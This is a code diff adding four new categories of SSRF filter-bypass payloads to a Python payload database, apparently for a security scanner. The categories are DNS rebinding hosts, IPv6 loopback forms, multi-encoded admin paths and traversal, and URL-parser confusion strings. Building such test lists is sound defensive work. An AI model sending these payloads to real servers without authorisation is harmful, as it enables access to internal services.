@@ -19,7 +19,11 @@ class SSRFPayloadDatabase:
             'localhost_variants': self._get_localhost_variants(),
             'port_scanning': self._get_port_scanning_payloads(),
             'url_parsing_bypass': self._get_url_parsing_bypass(),
-            'unicode_bypass': self._get_unicode_bypass()
+            'unicode_bypass': self._get_unicode_bypass(),
+            'dns_rebinding': self._get_dns_rebinding_payloads(),
+            'ipv6_bypass': self._get_ipv6_bypass_payloads(),
+            'encoding_bypass': self._get_encoding_bypass_payloads(),
+            'parsing_confusion': self._get_parsing_confusion_payloads()
         }
 
     def _get_basic_internal_payloads(self) -> List[Dict[str, Any]]:
@@ -282,6 +286,173 @@ class SSRFPayloadDatabase:
                 'description': 'Unicode dots',
                 'category': 'unicode_bypass',
                 'risk_level': 'high'
+            }
+        ]
+
+    def _get_dns_rebinding_payloads(self) -> List[Dict[str, Any]]:
+        """DNS 리바인딩 우회 기법 (PayloadsAllTheThings 기반)"""
+        return [
+            {
+                'payload': 'http://make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms/',
+                'description': 'DNS rebinding service 1u.ms',
+                'category': 'dns_rebinding',
+                'risk_level': 'critical',
+                'technique': 'dns_rebinding'
+            },
+            {
+                'payload': 'http://make-192.168.1.1-rebind-127.0.0.1-rr.1u.ms/',
+                'description': 'DNS rebinding to localhost from private IP',
+                'category': 'dns_rebinding',
+                'risk_level': 'critical',
+                'technique': 'dns_rebinding'
+            },
+            {
+                'payload': 'http://localtest.me/',
+                'description': 'localtest.me always resolves to 127.0.0.1',
+                'category': 'dns_rebinding',
+                'risk_level': 'high',
+                'technique': 'domain_redirect'
+            },
+            {
+                'payload': 'http://localh.st/',
+                'description': 'localh.st alternative redirect service',
+                'category': 'dns_rebinding',
+                'risk_level': 'high',
+                'technique': 'domain_redirect'
+            },
+            {
+                'payload': 'http://company.127.0.0.1.nip.io/',
+                'description': 'nip.io wildcard DNS service',
+                'category': 'dns_rebinding',
+                'risk_level': 'critical',
+                'technique': 'nip_io'
+            }
+        ]
+
+    def _get_ipv6_bypass_payloads(self) -> List[Dict[str, Any]]:
+        """IPv6 표기법 우회 기법"""
+        return [
+            {
+                'payload': 'http://[::]:80/',
+                'description': 'IPv6 unspecified address',
+                'category': 'ipv6_bypass',
+                'risk_level': 'high',
+                'technique': 'ipv6_notation'
+            },
+            {
+                'payload': 'http://[0000::1]:80/',
+                'description': 'IPv6 loopback address',
+                'category': 'ipv6_bypass',
+                'risk_level': 'high',
+                'technique': 'ipv6_notation'
+            },
+            {
+                'payload': 'http://[0:0:0:0:0:ffff:127.0.0.1]/',
+                'description': 'IPv6 mapped IPv4 address (full)',
+                'category': 'ipv6_bypass',
+                'risk_level': 'critical',
+                'technique': 'ipv6_mapped'
+            },
+            {
+                'payload': 'http://[::ffff:127.0.0.1]/',
+                'description': 'IPv6 mapped IPv4 address (short)',
+                'category': 'ipv6_bypass',
+                'risk_level': 'critical',
+                'technique': 'ipv6_mapped'
+            },
+            {
+                'payload': 'http://[::ffff:7f00:1]/',
+                'description': 'IPv6 mapped with hex notation',
+                'category': 'ipv6_bypass',
+                'risk_level': 'high',
+                'technique': 'ipv6_hex'
+            }
+        ]
+
+    def _get_encoding_bypass_payloads(self) -> List[Dict[str, Any]]:
+        """고급 인코딩 우회 기법"""
+        return [
+            {
+                'payload': 'http://127.0.0.1/%61dmin',
+                'description': 'Single URL encoding bypass',
+                'category': 'encoding_bypass',
+                'risk_level': 'medium',
+                'technique': 'single_url_encoding'
+            },
+            {
+                'payload': 'http://127.0.0.1/%2561dmin',
+                'description': 'Double URL encoding bypass',
+                'category': 'encoding_bypass',
+                'risk_level': 'high',
+                'technique': 'double_url_encoding'
+            },
+            {
+                'payload': 'http://127.0.0.1/%252561dmin',
+                'description': 'Triple URL encoding bypass',
+                'category': 'encoding_bypass',
+                'risk_level': 'high',
+                'technique': 'triple_url_encoding'
+            },
+            {
+                'payload': 'http://127.0.0.1/%%32%65%%32%65%%32%66',
+                'description': 'Mixed encoding traversal',
+                'category': 'encoding_bypass',
+                'risk_level': 'critical',
+                'technique': 'mixed_encoding'
+            },
+            {
+                'payload': 'http://127.0.0.1/%00%00%00%61%00%00%00d%00%00%00m%00%00%00i%00%00%00n',
+                'description': 'UTF-32 encoding with null bytes',
+                'category': 'encoding_bypass',
+                'risk_level': 'critical',
+                'technique': 'utf32_encoding'
+            }
+        ]
+
+    def _get_parsing_confusion_payloads(self) -> List[Dict[str, Any]]:
+        """URL 파싱 불일치 공격"""
+        return [
+            {
+                'payload': 'http://127.1.1.1:80\\@127.2.2.2:80/',
+                'description': 'Backslash @ confusion',
+                'category': 'parsing_confusion',
+                'risk_level': 'critical',
+                'technique': 'backslash_at'
+            },
+            {
+                'payload': 'http://127.1.1.1:80\\@@127.2.2.2:80/',
+                'description': 'Double @ confusion',
+                'category': 'parsing_confusion',
+                'risk_level': 'critical',
+                'technique': 'double_at'
+            },
+            {
+                'payload': 'http://127.1.1.1:80:\\@@127.2.2.2:80/',
+                'description': 'Colon backslash @ confusion',
+                'category': 'parsing_confusion',
+                'risk_level': 'critical',
+                'technique': 'colon_backslash_at'
+            },
+            {
+                'payload': 'http://127.1.1.1:80#\\@127.2.2.2:80/',
+                'description': 'Fragment confusion',
+                'category': 'parsing_confusion',
+                'risk_level': 'high',
+                'technique': 'fragment_confusion'
+            },
+            {
+                'payload': 'http://example.com@127.0.0.1/',
+                'description': 'Username @ localhost',
+                'category': 'parsing_confusion',
+                'risk_level': 'critical',
+                'technique': 'username_at'
+            },
+            {
+                'payload': 'http://127.0.0.1#@example.com/',
+                'description': 'Fragment @ confusion',
+                'category': 'parsing_confusion',
+                'risk_level': 'medium',
+                'technique': 'fragment_at'
             }
         ]
 
